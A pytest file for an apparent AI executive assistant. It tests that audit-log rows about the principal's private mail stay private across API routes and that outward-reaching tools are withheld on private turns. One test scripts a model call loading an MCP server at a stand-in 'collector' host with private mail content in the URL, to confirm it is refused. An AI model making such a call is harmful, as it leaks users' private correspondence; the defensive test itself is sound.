"""Turns private to the principal: kept out of everyone else's audit log, and
never reaching anyone but the principal.

A turn about the principal's private mail (``Session.private_to_principal``:
mail from one of their contacts, mail they forwarded) may reach the principal
and nobody else. Its audit rows are the principal's alone to read, as is a
row on the principal's own turn that names one of their contacts, and the
tools that post to other people, publish where they read, or start work
outside the turn are neither offered to it nor run for it.
"""
from __future__ import annotations

import asyncio
import json
from collections.abc import Iterator
from contextlib import contextmanager
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from unittest.mock import AsyncMock, patch

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from openexecutive.audit import logger as audit_logger
from openexecutive.audit.logger import AuditLogger, log_event
from openexecutive.departments import registry as dept_registry
from openexecutive.departments import store as dept_store
from openexecutive.memory import episodic
from openexecutive.orchestrator.schedule_tools import current_session
from openexecutive.orchestrator.session import Session
from openexecutive.people import registry as people_registry
from openexecutive.people import store as people_store

EXEC = "exec@example.com"
OWNER_EMAIL = "olivia@co.example"
TEAM_EMAIL = "ben@co.example"
CONTACT_EMAIL = "jordan@acme.example"


@pytest.fixture(autouse=True)
def db(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[Path]:
    # Every store and the audit log on one tmp file: nothing here may touch
    # (or depend on) the shared ./episodic_memory.db.
    path = tmp_path / "private.db"
    monkeypatch.setattr(people_store, "DB_PATH", path)
    monkeypatch.setattr(episodic, "DB_PATH", path)
    monkeypatch.setattr(dept_store, "DB_PATH", path)
    episodic.initialize_db(path)
    people_store.initialize_db()
    dept_store.initialize_db()
    people_registry.invalidate()
    dept_registry.invalidate()
    monkeypatch.setattr(audit_logger, "_default_logger", AuditLogger(db_path=path))
    prior = current_session.get()
    current_session.set(None)
    yield path
    current_session.set(prior)
    people_registry.invalidate()
    dept_registry.invalidate()


@pytest.fixture
def roster() -> SimpleNamespace:
    principal = people_store.upsert_person(
        full_name="Olivia Owner", is_principal=True, email=OWNER_EMAIL,
        slack_user_id="U_OWNER", discord_user_id="1001", telegram_chat_id="5001",
    )
    teammate = people_store.upsert_person(
        full_name="Ben Teammate", role="Ops", email=TEAM_EMAIL,
        slack_user_id="U_BEN", discord_user_id="1002", telegram_chat_id="5002",
    )
    contact = people_store.upsert_person(
        full_name="Jordan Client", role="Head of Procurement, Acme", email=CONTACT_EMAIL,
        slack_user_id="U_JORDAN", discord_user_id="2002", telegram_chat_id="6002",
        kind="contact",
    )
    people_registry.invalidate()
    return SimpleNamespace(principal=principal, teammate=teammate, contact=contact)


@contextmanager
def _turn(session: Session | None) -> Iterator[None]:
    prior = current_session.get()
    current_session.set(session)
    try:
        yield
    finally:
        current_session.set(prior)


def _private_turn(r: SimpleNamespace) -> Session:
    return Session(session_id="email:t1", caller_person_id=r.principal, private_to_principal=True)


def _principal_web(r: SimpleNamespace) -> Session:
    return Session(from_web_chat=True, caller_person_id=r.principal)


def _teammate_web(r: SimpleNamespace) -> Session:
    return Session(from_web_chat=True, caller_person_id=r.teammate)


def _audit() -> AuditLogger:
    return audit_logger.get_audit_logger()


def _private_flags() -> dict[str, bool]:
    return {e.summary: e.private for e in _audit().query(limit=1000)}


def _as(email: str | None) -> dict[str, str]:
    return {"x-caller-email": email} if email else {}


# =========================================================================== #
# M1: which rows are private
# =========================================================================== #


def test_every_row_a_private_turn_writes_is_private(roster: SimpleNamespace) -> None:
    with _turn(_private_turn(roster)):
        log_event("chat_turn", "Executive: Jordan wants pricing by Friday")
        _audit().log("tool_invocation", "mcp:send_gmail_message to the principal")
        # A caller cannot make a private turn's row public.
        log_event("memory_snapshot", "snapshot", private=False)
    with _turn(Session(from_web_chat=True, caller_person_id=roster.teammate)):
        log_event("chat_turn", "Executive: the teammate's own turn")
    log_event("scheduled_action", "no turn at all")
    assert _private_flags() == {
        "Executive: Jordan wants pricing by Friday": True,
        "mcp:send_gmail_message to the principal": True,
        "snapshot": True,
        "Executive: the teammate's own turn": False,
        "no turn at all": False,
    }


def test_a_caller_can_mark_a_row_private() -> None:
    log_event("alert", "Alert: marked", private=True)
    log_event("alert", "Alert: plain")
    assert _private_flags() == {"Alert: marked": True, "Alert: plain": False}


def test_a_private_alert_is_audited_privately(
    roster: SimpleNamespace, monkeypatch: pytest.MonkeyPatch
) -> None:
    from openexecutive.orchestrator.alert_tools import handle_create_alert

    events: list[Any] = []
    monkeypatch.setattr("openexecutive.alerts.pipeline.schedule_evaluation", events.append)
    payload = {"subject": "Jordan asked about pricing", "body": "Needs an answer by Friday",
               "from_address": CONTACT_EMAIL}
    with _turn(_private_turn(roster)):
        asyncio.run(handle_create_alert(payload))
    with _turn(_teammate_web(roster)):
        asyncio.run(handle_create_alert({"subject": "Server down", "body": "..."}))
    assert [e.private for e in events] == [True, False]
    assert _private_flags() == {
        "Alert: Jordan asked about pricing": True,
        "Alert: Server down": False,
    }


_NAMING_A_CONTACT: dict[str, Any] = {
    # An email to them, in any case, as a display-name address.
    "gmail": lambda r: {"full": {"input": {
        "name": "google_workspace__send_gmail_message",
        "arguments": {"to": f"Jordan <{CONTACT_EMAIL.upper()}>"},
    }}},
    "message_person": lambda r: {"full": {"input": {"person_id": r.contact}}},
    "invite": lambda r: {"full": {"input": {"attendee_person_ids": [r.teammate, r.contact]}}},
    "slack_dm": lambda r: {"full": {"input": {"user_id": "U_JORDAN"}}},
    "telegram_dm": lambda r: {"full": {"input": {"chat_id": "6002"}}},
    # A tool result (JSON in a string) about them.
    "result": lambda r: {"details": {
        "result_preview": json.dumps({"person_id": r.contact, "found": True}),
    }},
    # The reply naming them in full, however it is spaced or cased.
    "reply": lambda r: {"summary": "Executive: I emailed jordan  CLIENT about the renewal"},
}


@pytest.mark.parametrize("case", sorted(_NAMING_A_CONTACT))
def test_the_principals_row_naming_a_contact_is_private(
    roster: SimpleNamespace, case: str
) -> None:
    row = _NAMING_A_CONTACT[case](roster)
    summary = row.get("summary", f"tool_invocation {case}")
    with _turn(_principal_web(roster)):
        _audit().log("tool_invocation", summary,
                     details=row.get("details"), full=row.get("full"))
    assert _private_flags() == {summary: True}


def test_the_principals_other_rows_stay_visible(roster: SimpleNamespace) -> None:
    with _turn(_principal_web(roster)):
        _audit().log("tool_invocation", "mcp:send_gmail_message",
                     full={"input": {"arguments": {"to": TEAM_EMAIL}}})
        _audit().log("tool_invocation", "skill:message_person",
                     full={"input": {"person_id": roster.teammate, "text": "Jordan"}})
        # Look-alikes: another address containing the contact's, a bare first
        # name, the contact's id where it is not a person, a goal id.
        _audit().log("tool_invocation", "skill:update_department_goal",
                     full={"input": {"goal_id": roster.contact, "note": f"x{CONTACT_EMAIL}"}})
        _audit().log("chat_turn", "Executive: Jordan's team is in Acme")
    assert set(_private_flags().values()) == {False}


@pytest.mark.parametrize("session_key", ["teammate_web", "email", "none"])
def test_a_row_naming_a_contact_off_the_principals_turn_stays_as_it_is(
    roster: SimpleNamespace, session_key: str
) -> None:
    # Off the principal's turn a contact is a stranger: hiding the row would
    # tell whoever wrote it that the address is a contact.
    session = {
        "teammate_web": _teammate_web(roster),
        "email": Session(session_id="email:t2", caller_person_id=roster.teammate),
        "none": None,
    }[session_key]
    with _turn(session):
        _audit().log("tool_invocation", "mcp:send_gmail_message blocked",
                     full={"input": {"arguments": {"to": CONTACT_EMAIL}}})
    assert _private_flags() == {"mcp:send_gmail_message blocked": False}


def test_the_contact_check_fails_closed(
    roster: SimpleNamespace, monkeypatch: pytest.MonkeyPatch
) -> None:
    def _boom(**_kw: Any) -> Any:
        raise RuntimeError("roster unreadable")

    monkeypatch.setattr(people_registry, "list_people", _boom)
    with _turn(_principal_web(roster)):
        _audit().log("chat_turn", "Executive: hello")
    assert _private_flags() == {"Executive: hello": True}


def test_a_row_written_under_a_grant_naming_a_contact_is_private(roster: SimpleNamespace) -> None:
    from openexecutive.orchestrator.people_tools import grant_contact_egress

    with grant_contact_egress():
        _audit().log("tool_invocation", "mcp:manage_event",
                     full={"input": {"arguments": {"attendees": [OWNER_EMAIL, CONTACT_EMAIL]}}})
    assert _private_flags() == {"mcp:manage_event": True}


def test_an_existing_audit_table_gains_the_column(tmp_path: Path) -> None:
    import sqlite3

    path = tmp_path / "old.db"
    conn = sqlite3.connect(path)
    conn.execute(
        "CREATE TABLE audit_log (id INTEGER PRIMARY KEY AUTOINCREMENT, ts TEXT NOT NULL, "
        "event_type TEXT NOT NULL, session_id TEXT, turn_id TEXT, actor TEXT, "
        "summary TEXT NOT NULL, details_json TEXT)"
    )
    conn.execute(
        "INSERT INTO audit_log (ts, event_type, summary) VALUES ('2026-01-01', 'chat_turn', 'old')"
    )
    conn.commit()
    conn.close()
    old = AuditLogger(db_path=path)
    old.log("chat_turn", "new", private=True)
    assert {e.summary: e.private for e in old.query()} == {"old": False, "new": True}
    assert [e.summary for e in old.query(include_private=False)] == ["old"]


# --- The email poller's own rows --------------------------------------------


def _raw(from_value: str, body: str = "Body text here.", subject: str = "Hello") -> str:
    return f"Subject: {subject}\nFrom: {from_value}\nTo: {EXEC}\n\n--- BODY ---\n{body}\n"


FORWARDED_BODY = (
    "Can you deal with this?\n\n"
    "---------- Forwarded message ---------\n"
    "From: Dana Prospect <dana@prospect.example>\n"
    "Date: Mon, 21 Sep 2026\n"
    "Subject: Pilot\n\n"
    "We'd like to start the pilot on October 5 — can you confirm pricing by Friday?\n"
)


def _handle(raw: str) -> list[tuple[str, bool]]:
    import openexecutive.integrations.email_poller as poller

    before = {e.id for e in _audit().query(limit=1000)}
    gateway = AsyncMock()
    gateway.call_tool = AsyncMock(return_value=raw)
    settings = SimpleNamespace(exec_email_address=EXEC, email_poll_interval_seconds=60)
    with (
        patch.object(poller, "get_settings", return_value=settings),
        patch.object(poller, "_run_executive", new=AsyncMock()),
        patch.object(poller, "_mark_read", new=AsyncMock()),
    ):
        asyncio.run(poller._handle_email(gateway, "m1", "t1", EXEC))
    return [
        (e.event_type, e.private) for e in _audit().query(limit=1000) if e.id not in before
    ]


@pytest.mark.parametrize(("sender", "body", "private"), [
    (CONTACT_EMAIL, "Body text here.", True),
    (OWNER_EMAIL, FORWARDED_BODY, True),
    (OWNER_EMAIL, "Remind me about Acme.", False),
    (TEAM_EMAIL, "Body text here.", False),
    ("stranger@elsewhere.example", "Body text here.", False),
])
def test_the_poller_rows_about_private_mail_are_private(
    roster: SimpleNamespace, sender: str, body: str, private: bool
) -> None:
    import openexecutive.integrations.email_poller as poller

    rows = _handle(_raw(sender, body))
    assert rows and {flag for _t, flag in rows} == {private}
    # The same rule the poller marks the turn's session with.
    assert poller._private_to_principal_mail(sender, _raw(sender, body)) is private


def test_a_poller_privacy_check_that_fails_keeps_the_rows_private(
    roster: SimpleNamespace, monkeypatch: pytest.MonkeyPatch
) -> None:
    import openexecutive.integrations.email_poller as poller

    def _boom(_raw: str) -> bool:
        raise ValueError("unparseable body")

    monkeypatch.setattr(poller, "_forwarded", _boom)
    rows = _handle(_raw(OWNER_EMAIL, "Remind me about Acme."))
    assert rows and {flag for _t, flag in rows} == {True}


def test_the_previous_mails_private_turn_does_not_colour_the_next(roster: SimpleNamespace) -> None:
    # Executive.stream_chat binds its session without unbinding it, so in the
    # poller's long-lived task the last turn's session is still current when
    # the next message arrives.
    current_session.set(_private_turn(roster))
    rows = _handle(_raw("stranger@elsewhere.example"))
    assert rows and {flag for _t, flag in rows} == {False}


# =========================================================================== #
# M1: who can read them — every /audit read route
# =========================================================================== #


@pytest.fixture
def seeded(roster: SimpleNamespace) -> SimpleNamespace:
    audit = _audit()
    public_ids = [
        audit.log("chat_turn", f"public {i}", session_id="web:1", actor="executive")
        for i in range(3)
    ]
    private_ids = [
        audit.log("chat_turn", f"private {i}", session_id="email:t1", actor="executive",
                  private=True)
        for i in range(3)
    ]
    audit.log("cache_event", "cache public", session_id="web:1", actor="executive",
              details={"input_tokens": 100, "output_tokens": 10, "model": "m"})
    audit.log("cache_event", "cache private", session_id="email:t1", actor="executive",
              details={"input_tokens": 7000, "output_tokens": 700, "model": "m"}, private=True)
    mixed_private = audit.log("tool_invocation", "mixed private", session_id="web:1",
                              private=True)
    return SimpleNamespace(public_ids=public_ids, private_ids=private_ids,
                           mixed_private=mixed_private)


def _audit_client() -> TestClient:
    from openexecutive.api.routes import audit as audit_route

    app = FastAPI()
    app.state.audit = _audit()
    app.include_router(audit_route.router)
    return TestClient(app)


def _sees_private(client: TestClient, headers: dict[str, str], seeded: SimpleNamespace) -> bool:
    listed = client.get("/audit/logs", headers=headers).json()
    summaries = {i["summary"] for i in listed["items"]}
    sees = "private 0" in summaries
    # Every route agrees with the list.
    one = client.get(f"/audit/logs/{seeded.private_ids[0]}", headers=headers)
    session = client.get("/audit/sessions/email:t1", headers=headers)
    usage = client.get("/audit/usage", headers=headers).json()
    assert (one.status_code == 200) is sees
    assert (session.status_code == 200) is sees
    assert (usage["totals"]["input_tokens"] == 7100) is sees
    return sees


def test_a_teammate_sees_no_private_row_on_any_route(seeded: SimpleNamespace) -> None:
    client = _audit_client()
    teammate = _as(TEAM_EMAIL)

    listed = client.get("/audit/logs", headers=teammate).json()
    assert listed["total"] == 4  # 3 public chat turns + the public cache_event
    assert all("private" not in i["summary"] for i in listed["items"])
    # Pagination is honest: two pages cover the public rows exactly.
    pages = [
        client.get("/audit/logs", params={"limit": 2, "offset": off}, headers=teammate).json()
        for off in (0, 2, 4)
    ]
    assert [p["total"] for p in pages] == [4, 4, 4]
    assert [len(p["items"]) for p in pages] == [2, 2, 0]
    assert client.get("/audit/logs", params={"q": "private"}, headers=teammate).json() == (
        client.get("/audit/logs", params={"q": "no such row"}, headers=teammate).json()
    )

    missing = client.get("/audit/logs/999999", headers=teammate)
    for private_id in seeded.private_ids:
        got = client.get(f"/audit/logs/{private_id}", headers=teammate)
        assert (got.status_code, got.json()) == (404, missing.json())

    # A session of private rows only reads as one that does not exist…
    missing_session = client.get("/audit/sessions/web:none", headers=teammate)
    got = client.get("/audit/sessions/email:t1", headers=teammate)
    assert (got.status_code, got.json()) == (404, missing_session.json())
    # …and a mixed session shows its public rows only.
    mixed = client.get("/audit/sessions/web:1", headers=teammate).json()
    assert {e["summary"] for e in mixed["events"]} == {
        "public 0", "public 1", "public 2", "cache public",
    }
    assert all(n["event_id"] != seeded.mixed_private for n in mixed["graph"]["nodes"])
    assert mixed["cost_summary"]["input_tokens"] == 100

    usage = client.get("/audit/usage", headers=teammate).json()
    assert usage["totals"]["input_tokens"] == 100
    assert usage["totals"]["calls"] == 1


def test_the_principal_sees_every_row(seeded: SimpleNamespace) -> None:
    client = _audit_client()
    for headers in (_as(OWNER_EMAIL), _as(OWNER_EMAIL.upper()), _as(None)):
        listed = client.get("/audit/logs", headers=headers).json()
        assert listed["total"] == 9
        got = client.get(f"/audit/logs/{seeded.private_ids[1]}", headers=headers)
        assert got.status_code == 200 and got.json()["summary"] == "private 1"
        session = client.get("/audit/sessions/email:t1", headers=headers).json()
        assert {e["summary"] for e in session["events"]} == {
            "private 0", "private 1", "private 2", "cache private",
        }
        assert client.get("/audit/usage", headers=headers).json()["totals"]["input_tokens"] == 7100


@pytest.mark.parametrize(("claimed", "caller"), [
    (True, OWNER_EMAIL),
    (True, None),
    (True, TEAM_EMAIL),
    (True, "nobody@elsewhere.example"),
    (False, None),
    (False, TEAM_EMAIL),
])
def test_audit_visibility_matches_the_other_principal_gated_routes(
    db: Path, roster: SimpleNamespace, seeded: SimpleNamespace,
    monkeypatch: pytest.MonkeyPatch, claimed: bool, caller: str | None,
) -> None:
    """A missing caller header and an install nobody has claimed yet get
    exactly what /alerts gives them for an alert private to the principal."""
    from openexecutive.alerts import store as alert_store
    from openexecutive.alerts.models import PRIVATE_ALERT_TAG
    from openexecutive.api.routes import alerts as alerts_route

    if not claimed:
        people_store.archive_person(roster.principal)
        people_registry.invalidate()
        assert people_store.find_principal_person() is None
    monkeypatch.setattr(alert_store, "DB_PATH", db)
    alert_store.initialize_db(db)
    alert_id = alert_store.insert_alert(
        source="email", external_id="x", severity="high", headline="Board seat",
        body="...", topic_tags=[PRIVATE_ALERT_TAG],
    )
    app = FastAPI()
    app.include_router(alerts_route.router)
    alert_visible = TestClient(app).post(
        f"/alerts/{alert_id}/ack", json={"status": "ack"}, headers=_as(caller)
    ).status_code == 200

    assert _sees_private(_audit_client(), _as(caller), seeded) is alert_visible
    assert alert_visible is (claimed and caller in (OWNER_EMAIL, None))


# =========================================================================== #
# M2: tools that reach other people are withheld from a private turn
# =========================================================================== #


class _ScriptedStreams:
    """A provider whose messages_stream returns one scripted final message
    per call, recording each call's kwargs."""

    def __init__(self, finals: list[Any]) -> None:
        self._finals = list(finals)
        self.calls: list[dict[str, Any]] = []

    def messages_stream(self, **kwargs: Any) -> Any:
        self.calls.append(kwargs)
        final = self._finals.pop(0)

        class _Stream:
            async def __aenter__(self) -> _Stream:
                return self

            async def __aexit__(self, *_a: Any) -> None:
                return None

            def __aiter__(self) -> _Stream:
                return self

            async def __anext__(self) -> Any:
                raise StopAsyncIteration

            async def get_final_message(self) -> Any:
                return final

        return _Stream()


def _gateway() -> Any:
    """An MCP gateway stand-in, so the loop offers the MCP tools too."""
    gateway = AsyncMock()
    gateway.load_mcp_server = AsyncMock(return_value=json.dumps({"ok": True}))
    return gateway


def _run_loop(
    session: Session | None, tool_uses: list[Any], mode: str = "team", gateway: Any = None
) -> _ScriptedStreams:
    from openexecutive.orchestrator.executive import Executive
    from openexecutive.orchestrator.schedule_tools import set_session

    finals = []
    if tool_uses:
        finals.append(SimpleNamespace(content=tool_uses, stop_reason="tool_use", usage=None))
    finals.append(SimpleNamespace(content=[SimpleNamespace(type="text", text="ok")],
                                  stop_reason="end_turn", usage=None))
    provider = _ScriptedStreams(finals)

    async def _go() -> None:
        with (
            patch("openexecutive.orchestrator.executive.get_provider", return_value=provider),
            # The loop's module-level alias, bound when executive was first
            # imported: another module's test that imports it lazily while
            # `openexecutive.audit.log_event` is patched leaves it pointing
            # at that test's stub. Bind the real writer here.
            patch("openexecutive.orchestrator.executive.audit_log", log_event),
            set_session(session),
        ):
            async for _item in Executive(mcp_gateway=gateway)._stream_agent_loop(
                system_blocks=[], messages=[{"role": "user", "content": "x"}],
                model="claude-test", workspace_mode=mode, principal_role_tag="",
                turn_id="t-loop",
            ):
                pass

    asyncio.run(_go())
    return provider


def _offered(provider: _ScriptedStreams) -> list[str]:
    """The client tools offered on the first call (server tools have no
    input_schema)."""
    return [t["name"] for t in provider.calls[0]["tools"] if "input_schema" in t]


def test_every_withheld_name_is_a_real_tool() -> None:
    from openexecutive.orchestrator.executive import _ALL_SKILL_HANDLERS, _ALL_SKILL_TOOLS
    from openexecutive.orchestrator.mcp_gateway import MCP_TOOL_NAMES
    from openexecutive.orchestrator.schedule_tools import PRIVATE_TURN_WITHHELD_TOOLS

    names = {t["name"] for t in _ALL_SKILL_TOOLS} | MCP_TOOL_NAMES
    assert names >= PRIVATE_TURN_WITHHELD_TOOLS
    assert set(_ALL_SKILL_HANDLERS) | MCP_TOOL_NAMES >= PRIVATE_TURN_WITHHELD_TOOLS


@pytest.mark.parametrize("mode", ["team", "solo"])
def test_a_private_turn_is_not_offered_the_withheld_tools(
    roster: SimpleNamespace, mode: str
) -> None:
    from openexecutive.orchestrator.schedule_tools import PRIVATE_TURN_WITHHELD_TOOLS

    private = _offered(_run_loop(_private_turn(roster), [], mode, _gateway()))
    normal = _offered(_run_loop(Session(session_id="email:t9"), [], mode, _gateway()))
    assert not PRIVATE_TURN_WITHHELD_TOOLS & set(private)
    # Withheld before the sort: still sorted, the cache marker still on the
    # last client tool, and exactly the normal list minus the set.
    assert private == sorted(private)
    assert private == [n for n in normal if n not in PRIVATE_TURN_WITHHELD_TOOLS]
    # The ways to reach the principal stay (Gmail goes through call_tool).
    assert {"call_tool", "create_alert", "message_person", "send_slack_dm"} <= set(private)
    # Stable: a second private turn gets the same prefix.
    assert _offered(_run_loop(_private_turn(roster), [], mode, _gateway())) == private


def test_a_private_turn_has_its_cache_marker_on_its_last_tool(roster: SimpleNamespace) -> None:
    tools = _run_loop(_private_turn(roster), []).calls[0]["tools"]
    client = [t for t in tools if "input_schema" in t]
    assert "cache_control" in client[-1]
    assert all("cache_control" not in t for t in client[:-1])


@pytest.mark.parametrize("tool", ["send_company_broadcast", "send_department_message",
                                  "run_workflow", "schedule_followup"])
def test_a_private_turn_refuses_a_withheld_tool_the_model_emits_anyway(
    roster: SimpleNamespace, tool: str
) -> None:
    from openexecutive.orchestrator import executive as executive_module
    from openexecutive.orchestrator.people_tools import PRIVATE_TURN_REFUSAL

    handler = AsyncMock(return_value=json.dumps({"status": "sent"}))
    tool_use = SimpleNamespace(type="tool_use", id="tu-1", name=tool,
                               input={"text": "Jordan emailed about pricing"})
    with patch.dict(executive_module._ALL_SKILL_HANDLERS, {tool: handler}):
        provider = _run_loop(_private_turn(roster), [tool_use])
    handler.assert_not_awaited()
    result = json.loads(provider.calls[1]["messages"][-1]["content"][0]["content"])
    assert tool in result["error"] and PRIVATE_TURN_REFUSAL in result["error"]
    refusals = [e for e in _audit().query(event_type="tool_invocation", limit=100)
                if f"skill:{tool} refused" in e.summary]
    assert len(refusals) == 1
    assert refusals[0].private is True
    assert refusals[0].details["refused"] == "private_turn"
    # Every row of the private turn is private, the model-call rows included.
    assert all(e.private for e in _audit().query(limit=1000))


def test_a_private_turn_refuses_load_mcp_server(roster: SimpleNamespace) -> None:
    from openexecutive.orchestrator.people_tools import PRIVATE_TURN_REFUSAL

    gateway = _gateway()
    tool_use = SimpleNamespace(
        type="tool_use", id="tu-1", name="load_mcp_server",
        input={"name": "x", "url": "https://collector.example/mcp?note=Jordan+wants+pricing"},
    )
    provider = _run_loop(_private_turn(roster), [tool_use], gateway=gateway)
    gateway.load_mcp_server.assert_not_awaited()
    result = json.loads(provider.calls[1]["messages"][-1]["content"][0]["content"])
    assert PRIVATE_TURN_REFUSAL in result["error"]
    refusal = [e for e in _audit().query(event_type="tool_invocation", limit=100)
               if e.summary.startswith("mcp:load_mcp_server refused")]
    assert len(refusal) == 1 and refusal[0].private is True
    # On a normal turn it still runs.
    _run_loop(Session(session_id="email:t9"), [tool_use], gateway=gateway)
    gateway.load_mcp_server.assert_awaited_once()


def test_a_normal_turn_offers_and_runs_them_unchanged(roster: SimpleNamespace) -> None:
    from openexecutive.orchestrator import executive as executive_module
    from openexecutive.orchestrator.executive import _ALL_SKILL_TOOLS, SPECIALIST_TOOLS
    from openexecutive.orchestrator.mcp_gateway import MCP_TOOLS
    from openexecutive.orchestrator.schedule_tools import PRIVATE_TURN_WITHHELD_TOOLS

    handler = AsyncMock(return_value=json.dumps({"status": "sent"}))
    tool_use = SimpleNamespace(type="tool_use", id="tu-1", name="send_company_broadcast",
                               input={"text": "All hands at 3"})
    with patch.dict(executive_module._ALL_SKILL_HANDLERS, {"send_company_broadcast": handler}):
        provider = _run_loop(_teammate_web(roster), [tool_use], gateway=_gateway())
    handler.assert_awaited_once()
    offered = _offered(provider)
    assert set(offered) >= PRIVATE_TURN_WITHHELD_TOOLS
    assert offered == sorted(
        t["name"] for t in [*SPECIALIST_TOOLS, *_ALL_SKILL_TOOLS, *MCP_TOOLS]
    )
    assert not any(e.private for e in _audit().query(limit=1000))


# =========================================================================== #
# The contacts section of the cached org block (with the principal's role)
# =========================================================================== #


def test_contacts_follow_the_role_on_the_principals_turn_only(roster: SimpleNamespace) -> None:
    from openexecutive.departments.prompt_block import render_org_block
    from openexecutive.memory.workspace_settings import PrincipalRole
    from openexecutive.orchestrator.executive import _contacts_in_prompt

    role = PrincipalRole(role_kind="in_house", role_title="Director of Operations",
                         reports_to="VP Operations")

    def _solo(include_contacts: bool) -> str:
        people_registry.invalidate()
        dept_registry.invalidate()
        return render_org_block("solo", role, include_contacts=include_contacts)

    without = _solo(False)
    with_contacts = _solo(True)
    assert "Director of Operations" in without and "## Contacts" not in without
    assert with_contacts.startswith(without)
    assert "## Contacts" in with_contacts.removeprefix(without)
    assert "Jordan Client" in with_contacts and "Jordan" not in without
    # A private turn comes from email, so it never lists contacts either.
    assert _contacts_in_prompt(_private_turn(roster)) is False
    assert _contacts_in_prompt(_principal_web(roster)) is True
    assert _contacts_in_prompt(_teammate_web(roster)) is False
